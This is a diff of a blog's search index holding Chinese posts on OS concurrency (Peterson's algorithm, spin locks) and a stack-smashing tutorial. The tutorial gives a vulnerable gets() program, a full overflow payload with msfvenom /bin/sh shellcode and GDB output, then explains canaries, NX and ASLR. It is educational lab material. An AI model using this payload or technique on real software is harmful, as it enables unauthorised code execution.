@@ -1737,6 +1737,198 @@
       </categories>
   </entry>
   <entry>
+    <title>NJU-OS Lecture 04: Understanding Concurrent Programs</title>
+    <url>/2022/02/23/NJU-OS%20Lecture%2004%20-%20Understanding%20Concurrent%20Programs/</url>
+    <content><![CDATA[<p>互斥 (mutual exclusion)：保证两个线程不能同时 (并发) 执行一段代码。</p>
+<p>对于 <code>sum.c</code> ，我们希望添加两个魔法函数 lock() 和 unlock()，使得魔法函数中间的代码具有互斥性：</p>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">void Tsum()</span><br><span class="line">&#123;</span><br><span class="line">	for (int i = 0; i &lt; N; i++)</span><br><span class="line">	&#123;</span><br><span class="line"><span class="addition">+		lock();</span></span><br><span class="line">		sum++;</span><br><span class="line"><span class="addition">+		unlock();</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>一个失败的尝试：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOCK   1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNLOCK 0</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">critical_section</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">retry:</span><br><span class="line">    <span class="keyword">if</span> (locked != UNLOCK)   <span class="comment">//*</span></span><br><span class="line">        <span class="keyword">goto</span> entry;</span><br><span class="line">    locked = LOCK;          <span class="comment">//**</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// critical section</span></span><br><span class="line">    </span><br><span class="line">    locked = UNLOCK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从状态机的角度：</p>
+<pre class="mermaid">stateDiagram-v2
+    state1: T1-L*, T2-L*
+    state1 --> state2: 线程T1执行
+    state1 --> state3: 线程T2执行
+    state3: ……
+    state2: T1-L**, T2-L*
+    state2 --> state4: 线程T1执行
+    state2 --> state5: 线程T2执行
+    state4: ……
+    state5: T1-L**, T2-L**</pre>
+
+<p>可以看到存在一个状态，T1 和 T2 同时获得了锁。该方法失败的根本原因是：我们读锁状态的操作和写锁状态的操作无法原子地执行。</p>
+<h2 id="Peterson-Algorithm"><a href="#Peterson-Algorithm" class="headerlink" title="Peterson Algorithm"></a>Peterson Algorithm</h2><p>理解并发的最好方法就是用物理世界中的东西作类比：</p>
+<ul>
+<li>对共享内存的写：往黑板上贴便签条</li>
+<li>对共享内存的读：看黑板 (其实不同于人类，计算机的“读”只能看到一个“历史状态”)</li>
+</ul>
+<hr>
+<p>假设 Alice 和 Bob 想上厕所，为了不一起进入厕所，他们制定了如下协议：</p>
+<ul>
+<li>Alice 想上厕所，于是举起了自己的旗子 (step1，相当于 STORE 一个共享的变量)，然后将 Bob (对方) 的名字写在厕所门上 (step2，也相当于 STORE 一个共享变量)；如果 Bob 想上厕所也是同理。注意厕所门上的名字是可以覆盖的。</li>
+<li>Alice 检查门上的名字和厕所 (step3)，Alice 可以进入厕所当且仅当 Bob 没有举旗子，或者门上的名字是自己的。</li>
+<li>Alice 上完厕所后，把自己的旗子放下来 (step4)。</li>
+</ul>
+<p>我们讨论几种情况：</p>
+<ul>
+<li>Alice 检查的时候，如果 Bob 没举旗子，说明 Bob 还不想上厕所，那 Alice 可以上厕所。</li>
+<li>如果 Bob 也举旗子了，那结果是：先举旗子的人可以先进入厕所，因为后举旗子的人会把先举旗子的人的名字贴在门上，覆盖了先贴的人的内容。</li>
+<li>……</li>
+</ul>
+<p>一个完备的证明方法是画状态机。我们设置状态机 $(PC_1, PC_2, x, y, turn,status)$，六个状态分别表示 T1/T2 执行到第几行，T1/T2 的旗子有没有举起来，当前厕所门上写的是谁的名字，以及当前厕所状态。</p>
+<pre class="mermaid">stateDiagram-v2
+    s1: (1, 1, 0, 0, A, e)
+    s1 --> s2: T1
+    s2: (2, 1, 1, 0, A, e)
+    s1 --> s3: T2
+    s3: (1, 2, 0, 1, A, e)
+    note left of s3
+        T1先执行与T2先执行完全等价
+        该分支省略
+    end note
+    s2 --> s4: T1
+    s4: (3, 1, 1, 0, B, e)
+    s2 --> s5: T2
+    s5: (2, 2, 1, 1, A, e) 
+    s4 --> s6: T1
+    s6: (3, 1, 1, 0, B, A)
+    s4 --> s7: T2
+    s7: (3, 2, 1, 1, B, e)
+    s7 --> s7: T1
+    s7 --> s20: T2
+    s20: (3, 3, 1, 1, A, e)
+    s20 --> s14: T1
+    s20 --> s20: T2
+    s5 --> s7: T1
+    s5 --> s9: T2
+    s9: (2, 3, 1, 1, A, e)
+    note right of s9
+        与左孩子完全等价
+        该分支省略
+    end note
+    s6 --> s10: T1
+    s6 --> s11: T2
+    s11: (3, 2, 1, 1, B, A)
+    s10: (4, 1, 1, 0, B, e)
+    s10 --> s12: T1
+    s10 --> s15: T2
+    s12: (1, 1, 0, 0, B, e)
+    s15: (4, 2, 1, 1, B, e)
+    s11 --> s15: T1
+    s11 --> s14: T2
+    s14: (3, 3, 1, 1, A, A)
+    s14 --> s17: T1
+    s14 --> s14: T2
+    s15 --> s16: T1
+    s15 --> s17: T2
+    s16: (1, 2, 0, 1, B, e)
+    s17: (4, 3, 1, 1, A, e)
+    s17 --> s18: T1
+    s17 --> s17: T2
+    s18: (1, 3, 0, 1, A, e)</pre>
+
+<p>我们还可以写一个小程序验证 Peterson：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BARRIER __sync_synchronize()	</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">critical_section</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> cnt = atomic_fetch_add(&amp;count, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">int</span> i = atomic_fetch_add(&amp;nested, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (i != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d threads in the critical section @ count=%ld\n&quot;</span>, i, cnt);</span><br><span class="line">    assert(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  atomic_fetch_add(&amp;nested, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="keyword">volatile</span> x = <span class="number">0</span>, y = <span class="number">0</span>, turn;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    x = <span class="number">1</span>;                   BARRIER;</span><br><span class="line">    turn = B;                BARRIER; <span class="comment">// &lt;- this is critcal for x86</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!y) <span class="keyword">break</span>;         BARRIER;</span><br><span class="line">      <span class="keyword">if</span> (turn != B) <span class="keyword">break</span>;  BARRIER;</span><br><span class="line">    &#125;</span><br><span class="line">    critical_section();</span><br><span class="line">    x = <span class="number">0</span>;                   BARRIER;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    y = <span class="number">1</span>;                   BARRIER;</span><br><span class="line">    turn = A;                BARRIER;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!x) <span class="keyword">break</span>;         BARRIER;</span><br><span class="line">      <span class="keyword">if</span> (turn != A) <span class="keyword">break</span>;  BARRIER;</span><br><span class="line">    &#125;</span><br><span class="line">    critical_section();</span><br><span class="line">    y = <span class="number">0</span>;                   BARRIER;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 critical_section() 中，代码主要做的事情是操作一个共享变量，如果某个时刻 <code>nested == 2</code>，说明两个线程同时进入了临界区域，则报错。</p>
+<p>由于现代编译器和多处理器会调整语句顺序/乱序执行……所以我们在每条语句后面添加一条 <code>__sync_synchronize()</code> 来保证编译按照顺序进行，且多处理器之间具有可见性。事实证明，如果去掉 BARRIER 会发生错误。</p>
+<h2 id="Model-Checker"><a href="#Model-Checker" class="headerlink" title="Model Checker"></a>Model Checker</h2><p>我们希望用程序自动画出状态机。<a href="https://kristoff-starling.github.io/files/model-checker.py">model-checker.py</a> 帮助我们完成了这项工作，其中用到的 python 语言机制较多，暂时留坑。我们可以用 <code>model-checker.py</code> 中编写的装饰器来编写多个线程，<a href="https://kristoff-starling.github.io/files/peterson-flag.py">peterson-flag.py</a> 是一个示例。使用命令 <code>python3 model-checker.py xxx.py</code> 可以输出状态机的所有节点和转移关系。</p>
+<p><code>model-checker.py</code> 主要利用了 python generator 的机制来快速获得进程的状态机。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">numbers</span>(<span class="params">init=<span class="number">0</span>, step=<span class="number">1</span></span>):</span></span><br><span class="line">    n = init</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n += step</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line"></span><br><span class="line">g = numbers()</span><br><span class="line">h = numbers(<span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line"><span class="built_in">print</span>(g, h)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(g.__next__())</span><br><span class="line"><span class="built_in">print</span>(g.__next__())</span><br><span class="line"><span class="built_in">print</span>(h.__next__())</span><br><span class="line"><span class="built_in">print</span>(g.__next__())</span><br><span class="line"><span class="built_in">print</span>(h.__next__())</span><br></pre></td></tr></table></figure>
+
+<p>该程序输出结果为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;generator object numbers at 0x7f0a75b4fcf0&gt; &lt;generator object numbers at 0x7f0a759f9ba0&gt;</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">300</span><br><span class="line">3</span><br><span class="line">500</span><br></pre></td></tr></table></figure>
+
+<p>虽然 numbers() 里面是一个死循环，但执行 numbers() 还是可以退出，这得益于 <code>yield</code> 语句，yield 的功能类似于操作系统的调度，它会主动让出执行流。<code>g.__next__()</code> 语句可以从被打断处重新进入，继续执行函数直到遇到下一次 yield。如果我们在每一条语句后面都加上一个 yield，让 yield 后面返回所有的线程局部变量，我们就获得了函数每执行一步之后的状态机。</p>
+<p>Model checker 将验证程序正确性的问题转化成了一个图论问题：</p>
+<ul>
+<li><p>Safety (线程是否互斥)：从初始状态出发，是否存在到红色 (互斥失败) 节点的路径？</p>
+<blockquote>
+<p>图搜索</p>
+</blockquote>
+</li>
+<li><p>Liveness：是否从任意黑色 (没有人执行临界区域代码) 状态出发，总能在有限步内到达蓝色/绿色 (有一个线程执行临界区域代码) 节点？</p>
+<blockquote>
+<p>这等价于只考虑图中的黑色节点，是否存在环。只要对黑色节点的导出子图求 SCC 即可。</p>
+</blockquote>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>NJU-22020230 Operating Systems</category>
+        <category>Lecture Notes</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Stack-smashing Attack: An Introduction</title>
+    <url>/2022/02/28/Stack-smashing%20Attack%20-%20An%20Introduction/</url>
+    <content><![CDATA[<p>本文主要介绍一段简单的栈溢出攻击代码，并简介几种 Linux 中防止栈溢出攻击的方法。</p>
+<h2 id="Hack-Code"><a href="#Hack-Code" class="headerlink" title="Hack Code"></a>Hack Code</h2><blockquote>
+<p>注：为了实现的简单，受攻击的 C 程序编译时应加上如下参数：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -o vuln vuln.c -fno-<span class="built_in">stack</span>-protector -z execstack</span><br></pre></td></tr></table></figure>
+
+<p>这两个参数使得栈上数据可执行并取消了栈溢出检查。此外，我们还需要手动关闭 ASLR。</p>
+</blockquote>
+<span id="more"></span>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> msg[<span class="number">32</span>];</span><br><span class="line">	gets(msg);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>gets(msg)</code> 函数是一个非常危险的字符串读取函数，因为它完全无法控制会读取到几个字符，一旦读取的字符串长度超过 msg 的长度就会发生缓冲区溢出。最新版的 C 标准已经将 gets() 函数移除，fgets() 指定输入文件为 stdin 可以达到和 gets 相同的效果，不同的是 fgets() 可以指定输入长度的上限。下面介绍的 hack 代码正是利用了 gets() 不检查溢出的特性。</p>
+<p>使用 GDB 进行调试，通过命令 <code>i r rsp</code> 和 <code>i r rbp</code> 确定栈帧的位置，通过 <code>x/32x $rsp</code> 检查栈帧附近的内容，并确定 buf[] 的首地址为 0x7fffffffdd60。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsp = 0x7fffffffdd50 rbp = 0x7fffffffdd80 buf = 0x7fffffffdd60</span><br><span class="line"></span><br><span class="line">0x7fffffffdd50:	0xffffde78	0x00007fff	0x555551a0	0x00000001</span><br><span class="line">0x7fffffffdd60:	0x00000000	0x00000000	0x55555080	0x00005555</span><br><span class="line">0x7fffffffdd70:	0xffffde70	0x00007fff	0x00000000	0x00000000</span><br><span class="line">0x7fffffffdd80:	0x00000000	0x00000000	0xf7de9565	0x00007fff</span><br><span class="line">0x7fffffffdd90:	0xffffde78	0x00007fff	0xf7fc7000	0x00000001</span><br><span class="line">0x7fffffffdda0:	0x55555169	0x00005555	0xffffe209	0x00007fff</span><br><span class="line">0x7fffffffddb0:	0x555551a0	0x00005555	0xace3e1b6	0x2c1321da</span><br><span class="line">0x7fffffffddc0:	0x55555080	0x00005555	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
+
+<p>根据调用规约，在 64 位机器上，<code>rbp + 8</code> 处存放的是返回地址 0x7ffff7de9565。我们攻击的核心目标是利用 gets() 的缓冲区溢出改写返回地址，使得 main() 函数返回时可以跳转到我们的“恶意程序”上继续执行。</p>
+<p>我们的 hack code 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41</span><br><span class="line">\x90\xdd\xff\xff\xff\x7f\x00\x00</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52</span><br><span class="line">\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69</span><br><span class="line">\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>第一部分是 40 个字符 A，它的目的是填充整个栈帧，一直填到返回地址之前。</p>
+</li>
+<li><p>第二部分是我们希望的返回地址，这个数值是 0x7fffffffdd90 (返回地址所在地址的下一位)。由于我们提前关闭了 ASLR，所以栈帧的地址和返回地址都是不变的，我们可以直接将这个数值硬编码在 hack code 里。</p>
+</li>
+<li><p>第三部分是一串空字符，称为 NOP sled。在本程序中是不必要的 (因为没有 ASLR)，在打开 ASLR 的情况下，一段 NOP sled 可以提高攻击成功的概率，因为我们只要让返回地址落在 NOP sled 的范围内，CPU 便会执行 nop 指令，PC 不断后移，直到来到我们的恶意代码。</p>
+</li>
+<li><p>第四部分是我们的恶意程序，我们希望打开一个新的程序 <code>/bin/sh</code>。这里笔者使用了工具 msfvenom：</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/<span class="built_in">exec</span> CMD=/bin/sh -f c</span><br></pre></td></tr></table></figure>
+
+<p>  它可以自动生成一段打开 <code>/bin/sh</code> 的机器指令，并以 C 风格输出：</p>
+  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Payload size: <span class="number">44</span> bytes</span><br><span class="line">Final size of c file: <span class="number">209</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69&quot;</span></span><br><span class="line"><span class="string">&quot;\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05&quot;</span>;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>在 GDB 中运行，设置好断点后，通过 <code>run &lt; malice</code> 命令可以将输入重定向到我们的恶意代码。在 main() 函数返回之前，栈帧的数据如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7fffffffdd50:	0xffffde78	0x00007fff	0x555551a0	0x00000001</span><br><span class="line">0x7fffffffdd60:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffdd70:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffdd80:	0x41414141	0x41414141	0xffffdd90	0x00007fff</span><br><span class="line">0x7fffffffdd90:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x7fffffffdda0:	0x90909090	0x90909090	0x622fb848	0x732f6e69</span><br><span class="line">0x7fffffffddb0:	0x50990068	0x66525f54	0x54632d68	0x08e8525e</span><br><span class="line">0x7fffffffddc0:	0x2f000000	0x2f6e6962	0x56006873	0x6a5e5457</span><br><span class="line">0x7fffffffddd0:	0x050f583b	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 buf 前半部分都是 A，后面跟着我们的返回地址，一段 NOP sled 后是我们的恶意代码。</p>
+<p>继续执行，可以看到执行了一堆 push,pop 之后，最核心的三句话为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push $0x3b</span><br><span class="line">pop $rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>0x3b 是 execve() 系统调用的系统调用号，执行到 syscall 后，GDB 会提示：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">process 62464 is executing new program: /usr/bin/dash</span><br></pre></td></tr></table></figure>
+
+<p>我们的 hack code 成功运行了一个其他程序。</p>
+<h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>为了避免程序被过分容易地 hack，Linux 中有若干种栈溢出保护的机制。</p>
+<p>Stack Canary (金丝雀) 的思路是：在创建栈帧时，在栈帧底部存放一个特殊的值，这个值被称为金丝雀，并在函数返回之前查看金丝雀是否改变。如果函数执行过程中发生了栈溢出，则金丝雀一定被覆盖了，一旦发现金丝雀被改变则直接报错。</p>
+<p>对于之前的示例代码 <code>vuln.c</code>，如果我们在编译时不添加 <code>-fno-stack-protector</code>，观察反编译结果，可以看到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000001189 &lt;main&gt;:</span><br><span class="line">1189:	f3 0f 1e fa          	endbr64 </span><br><span class="line">118d:	55                   	push   %rbp</span><br><span class="line">118e:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">1191:	48 83 ec 40          	sub    $0x40,%rsp</span><br><span class="line">1195:	89 7d cc             	mov    %edi,-0x34(%rbp)</span><br><span class="line">1198:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)</span><br><span class="line">119c:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">11a3:	00 00 </span><br><span class="line">11a5:	48 89 45 f8          	mov    %rax,-0x8(%rbp)</span><br><span class="line">		......					......</span><br><span class="line">11cd:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx</span><br><span class="line">11d1:	64 48 2b 14 25 28 00 	sub    %fs:0x28,%rdx</span><br><span class="line">11d8:	00 00 </span><br><span class="line">11da:	74 05                	je     11e1 &lt;main+0x58&gt;</span><br><span class="line">11dc:	e8 9f fe ff ff       	call   1080 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">11e1:	c9                   	leave  </span><br><span class="line">11e2:	c3                   	ret    </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>119c 行的命令 <code>mov %fs:0x28, %rax</code> 将一个“奇妙”的数值存入 rax 寄存器，紧接着 11a5 行将这个值保存在了 <code>rbp - 8</code> 的位置，这便是金丝雀。在函数返回之前，11cd 行将金丝雀取出并在 11d1,11da 行对其值进行检查，如果不匹配则会在 11dc 行跳转到函数 __stack_chk_fail() 中。</p>
+<p>在打开 stack canary 的情况下，直接使用我们的 hack code，便会得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Program received signal SIGABRT, Aborted.</span><br></pre></td></tr></table></figure>
+
+<p>对抗金丝雀的技巧通常是利用一些读函数不遇到 <code>\0</code> 不停止的特性，把金丝雀的值泄漏出来，然后在进行栈溢出攻击的时候小心地处理金丝雀以骗过检查。</p>
+<h2 id="Non-executable-Stack"><a href="#Non-executable-Stack" class="headerlink" title="Non-executable Stack"></a>Non-executable Stack</h2><p>Linux 打开了 non-executable stack 用于防御栈溢出攻击。栈对应的页面的 NX bit 会被打开，表示栈上的数据不可执行。对于之前的 <code>vuln.c</code>，如果我们在编译时不加入 <code>-z execstack</code> 选项，则默认栈对应的页面都有 NX bit。此时直接使用我们的 hack code，会在跳转到 NOP sled 执行第一条 nop 指令时直接触发段错误。</p>
+<p>对抗 non-executable stack 的方法有 return-to-libc attack。攻击者将返回地址填写为 libc 库函数的地址，利用库函数语句来完成其攻击目的。在此基础上还有 ROP (return-oriented programming)，它不是利用完整的 libc 库函数，而是抓取多个靠近 <code>ret</code> 的零碎指令片段组合起来达到目的。</p>
+<h2 id="Address-Space-Layout-Randomization-ASLR"><a href="#Address-Space-Layout-Randomization-ASLR" class="headerlink" title="Address Space Layout Randomization (ASLR)"></a>Address Space Layout Randomization (ASLR)</h2><p>Linux 默认打开 ASLR，如果我们反复执行 <code>./vuln</code> ，会发现每次栈的位置都不一样，这使得我们无法准确判定需要攻击的地址。之前提到的 NOP sled 是一种可能的对抗 ASLR 的方法。</p>
+]]></content>
+      <categories>
+        <category>NJU-22020230 Operating Systems</category>
+        <category>Material</category>
+      </categories>
+  </entry>
+  <entry>
     <title>几种求解最大流算法的通俗解释</title>
     <url>/2021/10/07/%E5%87%A0%E7%A7%8D%E6%9C%80%E5%A4%A7%E6%B5%81%E7%AE%97%E6%B3%95%E7%9A%84%E9%80%9A%E4%BF%97%E8%A7%A3%E9%87%8A/</url>
     <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>流：一个函数 $f: V\times V\rightarrow \mathbb{R}$，满足</p>
@@ -2527,195 +2719,97 @@
       </categories>
   </entry>
   <entry>
-    <title>NJU-OS Lecture 04: Understanding Concurrent Programs</title>
-    <url>/2022/02/23/NJU-OS%20Lecture%2004%20-%20Understanding%20Concurrent%20Programs/</url>
-    <content><![CDATA[<p>互斥 (mutual exclusion)：保证两个线程不能同时 (并发) 执行一段代码。</p>
-<p>对于 <code>sum.c</code> ，我们希望添加两个魔法函数 lock() 和 unlock()，使得魔法函数中间的代码具有互斥性：</p>
-<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">void Tsum()</span><br><span class="line">&#123;</span><br><span class="line">	for (int i = 0; i &lt; N; i++)</span><br><span class="line">	&#123;</span><br><span class="line"><span class="addition">+		lock();</span></span><br><span class="line">		sum++;</span><br><span class="line"><span class="addition">+		unlock();</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>NJU-OS Lecture 05: Concurrent Programming: Mutex</title>
+    <url>/2022/03/01/NJU-OS%20Lecture%2005%20-%20Concurrent%20Programming%20-%20Mutex/</url>
+    <content><![CDATA[<p>从 high level 来看，我们希望实现如下的结构体和 API：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">typdef <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;lock;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">(lock *lk)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">(lock *lk)</span></span>;</span><br></pre></td></tr></table></figure>
 
 <span id="more"></span>
 
-<p>一个失败的尝试：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOCK   1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNLOCK 0</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">critical_section</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">retry:</span><br><span class="line">    <span class="keyword">if</span> (locked != UNLOCK)   <span class="comment">//*</span></span><br><span class="line">        <span class="keyword">goto</span> entry;</span><br><span class="line">    locked = LOCK;          <span class="comment">//**</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// critical section</span></span><br><span class="line">    </span><br><span class="line">    locked = UNLOCK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从状态机的角度：</p>
-<pre class="mermaid">stateDiagram-v2
-    state1: T1-L*, T2-L*
-    state1 --> state2: 线程T1执行
-    state1 --> state3: 线程T2执行
-    state3: ……
-    state2: T1-L**, T2-L*
-    state2 --> state4: 线程T1执行
-    state2 --> state5: 线程T2执行
-    state4: ……
-    state5: T1-L**, T2-L**</pre>
-
-<p>可以看到存在一个状态，T1 和 T2 同时获得了锁。该方法失败的根本原因是：我们读锁状态的操作和写锁状态的操作无法原子地执行。</p>
-<h2 id="Peterson-Algorithm"><a href="#Peterson-Algorithm" class="headerlink" title="Peterson Algorithm"></a>Peterson Algorithm</h2><p>理解并发的最好方法就是用物理世界中的东西作类比：</p>
+<p>若 lock() 函数返回，说明获得了这个锁，别的进程会停在 lock() 里直到获得锁的人调用了 unlock()。</p>
+<p>实现互斥的根本困难：不能同时读写共享内存。</p>
 <ul>
-<li>对共享内存的写：往黑板上贴便签条</li>
-<li>对共享内存的读：看黑板 (其实不同于人类，计算机的“读”只能看到一个“历史状态”)</li>
+<li>load 的时候不能 store，且看完之后眼睛立刻闭上，看到的都是过去的东西；</li>
+<li>store 的时候不能 load，贴字条的时候不知道覆盖了什么。</li>
+</ul>
+<h2 id="Spin-Lock"><a href="#Spin-Lock" class="headerlink" title="Spin Lock"></a>Spin Lock</h2><blockquote>
+<p>“解决一个问题有两种方法：一个是分析问题、提出算法、实现解决，一个是解决提出问题的人。“ —— jyy</p>
+</blockquote>
+<p>我们希望硬件支持一条“瞬间完成读和写”的指令：“请所有人闭眼，然后我睁开眼看一眼，并做一个操作”。</p>
+<h3 id="x86-Lock-Prefix"><a href="#x86-Lock-Prefix" class="headerlink" title="x86: Lock Prefix"></a>x86: Lock Prefix</h3><p>以 lock 为前缀的指令支持原子操作。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sum-atomic.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tsum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;lock addq $1, %0&quot;</span>: <span class="string">&quot;+m&quot;</span>(sum))</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  create(Tsum);</span><br><span class="line">  create(Tsum);</span><br><span class="line">  join();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
